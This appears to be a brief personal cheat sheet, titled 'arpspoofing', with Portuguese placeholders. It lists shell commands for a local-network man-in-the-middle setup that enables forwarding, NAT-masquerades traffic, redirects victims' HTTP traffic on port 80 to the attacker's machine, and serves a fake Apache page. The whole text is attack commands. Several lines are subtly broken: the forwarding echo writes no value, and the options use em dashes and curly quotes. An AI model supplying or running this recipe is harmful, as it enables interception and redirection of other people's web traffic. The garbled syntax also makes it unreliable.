# arpspoofing

echo > /proc/sys/net/ipv4/ip_forward

iptables -t nat —flush

iptables —zero

iptables -A FORWARD —in-interface ‘nome_interface’ -j ACCEPT

iptables -t nat —append POSTROUTING —out-interface ‘nome_interface’ -j MASQUERADE

iptables -t nat -A PREROUTING -p tcp —dport 80 —jump DNAT —to-destination ‘meuip’

apt-get install apache2

echo “esse site eh falso!!” > /var/www/html/index.html
